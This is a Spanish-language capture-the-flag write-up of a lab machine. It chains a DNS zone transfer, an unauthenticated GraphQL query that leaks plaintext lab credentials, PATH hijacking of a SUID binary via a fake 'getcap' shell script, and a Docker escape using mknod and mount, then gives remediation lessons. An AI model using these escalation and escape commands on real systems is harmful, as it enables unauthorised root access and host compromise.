---
layout: post
title: Kaboom - The Hacker Labs - Linux
date: 2026-10-24
img: /assets/img/kaboom/banner.png
tags:
  - web
  - dns
  - graphql
  - ssh
  - ssid
  - privesc
  - docker
  - container-escape
---

Explotamos una transferencia de zona DNS mal configurada para descubrir subdominios ocultos, uno de los cuales exponía una API GraphQL sin autenticación que filtró credenciales en texto plano. Con ellas accedimos por SSH, escalamos privilegios mediante PATH Hijacking sobre un binario SUID, y finalmente escapamos del contenedor Docker explotando capabilities excesivas (`cap_sys_admin` + `cap_mknod`) para montar el disco del host.

## Reconocimiento
Comenzamos con la fase de reconocimiento con nuestra herramienta *Auto-Recon*, para realizar este proceso inicial de forma automatizada.

![secnotes](/secnotes/assets/img/kaboom/Pasted%20image%2020261023215625.png)
![escaneo nmap](/secnotes/assets/img/kaboom/Pasted%20image%2020261023215644.png)
![escaneo de versiones](/secnotes/assets/img/kaboom/Pasted%20image%2020261023215718.png)
![escaneo gobuster](/secnotes/assets/img/kaboom/Pasted%20image%2020261023215735.png)

**información importante**

`whatweb` nos indica un error al abrir `http://kaboom.thl`, por ende falla también `gobuster`. Nosotros no hemos puesto esa dirección en nuestra herramienta de reconocimiento. Es por esto que agregamos esta dirección a nuestro archivo `/etc/hosts`.

Agregamos esta direccion al archivo

![/etc/hosts](Pasted%20image%2020261023220101.png)
y ahora al realizar un ping ya tenemos respuesta del servidor

![ping a host](/secnotes/assets/img/kaboom/Pasted%20image%2020261023220449.png)

## Enumeración

```bash 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-23 19:29 -0500
Nmap scan report for 192.168.192.171
Host is up (0.00055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
53/tcp   open  domain  ISC BIND 9.18.49-1~deb12u2 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.18.49-1~deb12u2-Debian
80/tcp   open  http    Apache httpd 2.4.68
|_http-title: Did not follow redirect to http://kaboom.thl/
|_http-server-header: Apache/2.4.68 (Debian)
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey: 
|   256 18:e7:04:95:4c:86:69:e8:fa:f3:a5:c9:61:a2:72:95 (ECDSA)
|_  256 7e:f1:68:35:ae:f0:5b:07:b3:b4:9a:30:a0:d5:8d:28 (ED25519)
MAC Address: 00:0C:29:1D:FF:7D (VMware)
Service Info: Host: _default_; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.44 seconds

```

Obtuvimos la siguiente información de interés. Servicio SSH(22), DNS(53), WEB(80) y SSH(2222).

Al ingresar al servicio web, nos encontramos con una página informativa, luego de inspeccionarla no encontramos nada de interés de primeras.

![web](/secnotes/assets/img/kaboom/Pasted%20image%2020261023220633.png)

![web kaboom](/secnotes/assets/img/kaboom/Pasted%20image%2020261023220652.png)
![terminal kaboom](/secnotes/assets/img/kaboom/Pasted%20image%2020261023220713.png)

Nada de utilidad de momento..

Nos enfocaremos en el servicio dns en el puerto 53, ya que para el servicio ssh necesitamos al menos un nombre de usuario.

Según la página amiga hacktricks, podemos intentar hacer una transferencias de zonas DNS (AXFR) contra un servidor DNS.

Esto lo logramos con la herramienta `dig` que es utilizada para hacer las consultas dns.

```bash
dig axfr kaboom.thl @192.168.192.171
```


`axfr`: es el tipo de consulta. AXFR significa "Authoritative Zone Transfer" y le pide al servidor que nos entregue toda la zona completa del dominio, no solo un registro puntual. Normalmente se usa para replicar datos entre un servidor DNS primario y sus secundarios.

`kaboom.thl`: Es el dominio (la zona) cuya información estamos pidiendo. (En laboratorios este dominio suele estar definido en el servidor DNS de la máquina objetivo)

`@192.168.192.171`: Es el servidor DNS al que le preguntamos directamente. El `@` le dice a `dig` que ignore nuestro DNS configurado y consulte a esta ip (que es la máquina del laboratorio).

**Por qué es importante en el Pentesting?

Si el servidor está mal configurado y permite transferencias de zonas a cualquiera (en vez de restringirlas a sus servidores secundarios), nos devuelve todos los registros de dominio: subdominios, IPs internas, servidores de correo, registros TXT, etc. Es una fuga de información muy útil en la fase de reconocimiento.

**Que esperamos en la salida?** 

Si es vulnerable, veremos una lista de registros (A, AAAA, CNAME, MX, NS, TXT, SOA...) y al final subdominios ocultos. Si no lo es, veremos un mensaje de error `; transfer failed` o `REFUSED`

El comando: `dig axfr kaboom.thl @192.168.192.171` nos entregó como resultado: 

```bash
──(yorve㉿SecNotes)-[~/Desktop]
└─$ dig axfr kaboom.thl @192.168.192.171

; <<>> DiG 9.20.29-1-Debian <<>> axfr kaboom.thl @192.168.192.171
; (1 server found)
;; global options: +cmd
kaboom.thl.		604800	IN	SOA	ns1.kaboom.thl. admin.kaboom.thl. 2026090201 604800 86400 2419200 604800
kaboom.thl.		604800	IN	NS	ns1.kaboom.thl.
ns1.kaboom.thl.		604800	IN	A	0.0.0.0
nuke-town-50.kaboom.thl. 604800	IN	A	0.0.0.0
tranzit-47.kaboom.thl.	604800	IN	A	0.0.0.0
kaboom.thl.		604800	IN	SOA	ns1.kaboom.thl. admin.kaboom.thl. 2026090201 604800 86400 2419200 604800
;; Query time: 3 msec
;; SERVER: 192.168.192.171#53(192.168.192.171) (TCP)
;; WHEN: Fri Oct 23 19:54:08 CDT 2026
;; XFR size: 6 records (messages 1, bytes 235)
```

Ahora que encontramos las sitios, vamos a agregarlos a nuestro archivo `/etc/hosts` y entrar a ellos en busca de nueva información.

![](/secnotes/assets/img/kaboom/Pasted%20image%2020261023225636.png)

En nuestra nueva dirección tenemos acceso a una terminal con grahql donde podemos realizar consultas.

![](/secnotes/assets/img/kaboom/Pasted%20image%2020261023225758.png)

## Explotación

Ahora nuestro primer paso lógico es utilizar una query de introspección, que nos revele todo el schema (tipos, campos, queries y mutaciones disponibles) si no está deshabilitada.

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

Esto debería decirnos que "tipos" existen (ej. `user`, `Flag`, `admin`, etc.) y qué campos podemos consultar.

```graphql
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {
              "name": "users"
            },
            {
              "name": "locations"
            },
            {
              "name": "secret"
            }
          ]
        },
        {
          "name": "users",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "username"
            },
            {
              "name": "score"
            }
          ]
        },
        {
          "name": "ID",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "locations",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            }
          ]
        },
        {
          "name": "secret",
          "fields": [
            {
              "name": "id"
            },
            {
              "name": "username"
            },
            {
              "name": "password"
            }
          ]
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description"
            },
            {
              "name": "types"
            },
            {
              "name": "queryType"
            },
            {
              "name": "mutationType"
            },
            {
              "name": "subscriptionType"
            },
            {
              "name": "directives"
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "specifiedByURL"
            },
            {
              "name": "fields"
            },
            {
              "name": "interfaces"
            },
            {
              "name": "possibleTypes"
            },
            {
              "name": "enumValues"
            },
            {
              "name": "inputFields"
            },
            {
              "name": "ofType"
            },
            {
              "name": "isOneOf"
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "args"
            },
            {
              "name": "type"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "type"
            },
            {
              "name": "defaultValue"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isRepeatable"
            },
            {
              "name": "locations"
            },
            {
              "name": "args"
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        }
      ]
    }
  }
}
```

El resultado nos revela tres queries principales en el tipo `Query`:

`users` = `id`, `username`, `score`
`location` = `id`, `name`, `description`
`secret` = `id`, `username`, `password`

Obviamente nuestro objetivo será `password`.

probamos con la siguiente consulta:

```graphql
{
  secret {
    id
    username
    password
  }
}
```

y el resultado que tanto nos gusta.

```graphql
{
  "data": {
    "secret": [
      {
        "id": "1",
        "username": "devops",
        "password": "Und3rgr0und_1945"
      },
      {
        "id": "2",
        "username": "reaper_07",
        "password": "Richtofen_Returns"
      },
      {
        "id": "3",
        "username": "omega",
        "password": "Project_MKULTRA"
      },
      {
        "id": "4",
        "username": "agent",
        "password": "Redacted_1979"
      },
      {
        "id": "5",
        "username": "kaboom",
        "password": "K4_b00m-!D0ubl3-P0ints_8"
      },
      {
        "id": "6",
        "username": "operator_09",
        "password": "BuriedBelow_1963"
      },
      {
        "id": "7",
        "username": "admin",
        "password": "Nuketown_Admin_02"
      },
      {
        "id": "8",
        "username": "zombie",
        "password": "Subject_935"
      },
      {
        "id": "9",
        "username": "operator_12",
        "password": "Blackout_2026"
      }
    ]
  }
}
```

de este resultado podemos rescatar 3 credenciales potencialmente útiles:

`admin / Nuketown_Admin_02`
`devops / Und3rgr0und_1945`
`kaboom / K4_b00m-!D0ubl3-P0ints_8`

Veremos si tenemos acceso vía ssh con estas credenciales.

Luego de varias pruebas con estos usuarios, tenemos acceso al servidor por el puerto 2222 con las credenciales del usuario `kaboom`

![agregar host a /etc/hosts](/secnotes/assets/img/kaboom/Pasted%20image%2020261024080446.png)

 Verificamos qué archivos existen en el directorio actual, encontramos la flag de usuario, y un archivo llamado `kaboom-check`, que contiene el binario SUID (tiene la letra `s` en lugar de `x` en los permisos del dueño `rws`. Esto significa que cuando cualquier usuario ejecuta este binario, el proceso corre con los privilegios del dueño del archivo (root), no con los permisos del usuario que los lanzó).
  
![nuketown](/secnotes/assets/img/kaboom/Pasted%20image%2020261024082840.png)

Analizamos este binario con `strings`

```bash
kaboom@c5118d55be96:~$ strings kaboom-check 
/lib64/ld-linux-x86-64.so.2
puts
perror
setuid
system
__libc_start_main
__cxa_finalize
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
setuid(0)
ll find this information useful
Checking capabilities with getcap:
getcap -r / 2>/dev/null
Checking capabilities with capsh:
capsh --print | grep -i Current
;*3$"
GCC: (Debian 12.2.0-14+deb12u1) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
kaboom-check.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
_edata
_fini
system@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
perror@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

## Escalada de Privilegios

Este binario nos avisa que comandos ejecuta.

```bash
getcap -r / 2>/dev/null
capsh --print | grep -i Current
```

El problema es que estos comandos (`getcap` y `capsh`) se llaman sin una ruta absoluta (no dice `/usr/sbin/getcap`, solo `getcap`). Cuando un programa hace esto, el sistema busca el comando recorriendo las carpetas listadas en la variable de entorno `$PATH`, en el orden que aparecen.

Entonces, si nosotros creamos nuestro propio archivo llamado `getcap` (que es realidad es una shell, `/bin/bash -p`), y ponemos la carpeta donde lo guardamos al principio del `$PATH`, el sistema encuentra nuestro archivo falso antes que el real del sistema. Como `kaboom-check` ya ejecutó `setuid(0)` antes de llamar a `system("getcap...")`, nuestro script falso se ejecuta con **privilegios de root heredados**.

```bash
kaboom@c5118d55be96:/tmp/esc$ cat << 'EOF' > getcap
> #!/bin/bash
> /bin/bash -p
> EOF
kaboom@c5118d55be96:/tmp/esc$ chmod +x getcap 
kaboom@c5118d55be96:/tmp/esc$ export PATH=/tmp/esc:$PATH

```

**Nota:** ponemos `/bin/bash -p` por que cuando bash detecta que el `UID` real (el usuario que lo invocó) es distinto el `EUID` (el usuario efectivo, en este caso root por el SUID), por seguridad baja automáticamente los privilegios. El argumento `-p` le dice a bash "*No hagas el downgrade, mantén los privilegios efectivos que tengas"*, sin él aunque el binario SUID nos diera los privilegios de root, bash los descartaría solo por iniciativa propia.

Luego modificamos el `$PATH` (`export PATH=/tmp/esc:$PATH`) con esto ponemos `/tmp/esc` primero, seguido de todo el `$PATH` que ya existía. El orden importa mucho, ya que el sistema busca en este orden carpeta por carpeta, y se quedará con la primera coincidencia que encuentre primero de nuestro archivo `getcap`.

## Escape de contenedor


```bash
kaboom@c5118d55be96:/tmp/esc$ /home/kaboom/kaboom-check 
You’ll find this information useful

Checking capabilities with getcap:

```

Ahora al ejecutar el binario, este buscará `getcap` en el `$PATH` que modificamos y encontrará nuestro archivo `getcap` falso que nos ejecuta una shell, y como tiene el SUID de root, automáticamente nos concede el acceso a una shell interactiva con sus privilegios.

![capabilities](/secnotes/assets/img/kaboom/Pasted%20image%2020261024085821.png)

Ahora tenemos acceso al sistema. Al buscar información nos encontramos con una nota.

```bash
cat note.txt

So, you have the user flag and you are root or almost root inside the container. 
Now you need to escape from it.

b 8 1

```

En este punto confirmamos lo que logramos, ser root dentro de un contenedor, pero esto es solo una etapa intermedia. Ahora el reto es escapar del contenedor hacia el sistema real.

Seguimos con el reconocimiento del entorno con los siguientes comandos:

```bash
cat /proc/1/cgroup
0::/
ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Sep  3 14:28 /.dockerenv
```

Esto nos confirma que estamos dentro de un contenedor, el siguiente paso es verificar las capabilities que tenemos.

```bash
capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_ptrace,!cap_sys_pacct,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read,!cap_perfmon,!cap_bpf,!cap_checkpoint_restore
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=1000(kaboom)
groups=1000(kaboom)
Guessed mode: HYBRID (4)
```

Tenemos dos importantes: 

`cap_sys_admin`: Es la llave para hacer tareas administrativas del sistema, entre ellas, **montar discos** (conectar un disco duro a una carpeta y ver su contenido)

`cap_mknod`: la llave para crear archivos especiales que representan hardware (como discos, impresoras, etc.)

Un contenedor bien configurado normalmente no debería tener estas llaves, y esto justo es la vulnerabilidad que vamos a explotar.

Usamos 

```bash
cat /proc/partitions
major minor  #blocks  name

   8        0   20971520 sda
   8        1   19970048 sda1
   8        2          1 sda2
   8        5     998400 sda5
```

Este comando nos mostró los "números de identificación" reales del disco

```bash
major minor  #blocks  name
   8        1   19970048 sda1
```

El **major 8** y **minor 1** son como el código de barras que el kernel de Linux usa para saber exactamente a qué piezas de hardware se refiere ese archivo. Y donde mas vemos estos números?

![nota root](/secnotes/assets/img/kaboom/Pasted%20image%2020261024091505.png)

En la nota cuando ingresamos al sistema como el usuario root...

Ahora crearemos una puerta hacia el disco del host gracias a `cap_mknod`.

```bash
mknod /dev/sda1 b 8 1
```

Con esto creamos manualmente ese archivo especial que el contenedor nos había ocultado. Es literal recrear la puerta hacia el disco real, usando el código de barras exacto (8 1) que confirmamos en el paso anterior.

`b`: le decimos al sistema que el archivo representa un disco
`8 1`: es el código de `sda1`

Seguimos con la apertura de la puerta y la entrada a la casa completa.

```bash
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
```

Con la llave `cap_sys_admin`, pudimos montar el disco (conectarlo a una carpeta `/mnt/host`) para poder navegar por su contenido como si fuera una carpeta normal. Y en este punto este disco ya no es del contenedor, sino que es el disco real de la máquina, cualquier cosa que veamos dentro de `/mnt/host/` ya no es una habitación falsa.

Nos movemos a la carpeta y obtenemos el flag de root.

```bash
pwd
/mnt/host/root
ls 
docker  root.txt
```



## Lecciones Aprendidas 

**Transferencia de zona DNS sin restricción:** el servidor DNS (ISC BIND) permitía AXFR a cualquier cliente, sin limitarlo a servidores secundarios autorizados. Esto filtró subdominios internos (`nuke-town-50`, `tranzit-47`) que no eran públicos. Solución: restringir `allow-transfer` en la configuración de BIND solo a IPs de servidores secundarios conocidos. 

**API GraphQL sin autenticación ni control de acceso:** la introspección del schema estaba habilitada y el resolver `secret` devolvía credenciales en texto plano sin ningún tipo de autenticación. Solución: deshabilitar introspección en producción y aplicar control de acceso (autenticación + autorización) a nivel de resolver, no solo a nivel de endpoint.  

**Gestión de credenciales y contraseñas:** las contraseñas se almacenaban y transmitían en texto plano, permitiendo su uso directo para pivotar a otros servicios (SSH). Solución: hashear contraseñas (bcrypt/argon2) y nunca exponerlas en ninguna respuesta de API. - **Binario SUID inseguro (PATH Hijacking):** `kaboom-check` invocaba comandos externos (`getcap`, `capsh`) sin ruta absoluta, permitiendo interceptarlos vía manipulación de `$PATH`. Solución: los binarios SUID deben usar siempre rutas absolutas (`/usr/sbin/getcap`) y, si es posible, evitar `system()`/`popen()` en favor de `exec*()` con rutas fijas. 

**Principio de menor privilegio en contenedores:** el contenedor corría con capabilities excesivas (`cap_sys_admin`, `cap_mknod`), suficientes para escapar por completo hacia el filesystem del host. Solución: ejecutar contenedores con `--cap-drop=ALL` y añadir solo las capabilities estrictamente necesarias para la aplicación. 

## Herramientas Usadas 

- `nmap` - `dig` - `whatweb` - `gobuster` - `nikto` - `curl` - `ssh` - `strings` - `capsh` - `mknod` - `mount`
